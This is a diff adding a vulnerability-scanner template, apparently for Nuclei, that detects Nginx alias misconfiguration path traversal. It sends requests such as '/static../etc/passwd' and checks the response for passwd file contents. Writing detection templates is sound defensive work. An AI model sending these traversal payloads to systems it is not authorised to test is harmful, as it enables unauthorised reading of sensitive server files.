@@ -1,0 +1,27 @@
+id: nginx-alias-traversal
+info:
+  name: Nginx Insecure Alias Directory Traversal
+  author: phantomscan
+  severity: high
+  description: Path traversal vulnerability caused by missing trailing slash in Nginx alias directive, allowing reading arbitrary files outside the web directory.
+  tags: cve,traversal,nginx,misconfig,high
+  reference:
+    - https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/
+  metadata:
+    cvss-score: 7.5
+
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}/static../etc/passwd"
+      - "{{BaseURL}}/assets../etc/passwd"
+      - "{{BaseURL}}/files../etc/passwd"
+      - "{{BaseURL}}/images../etc/passwd"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
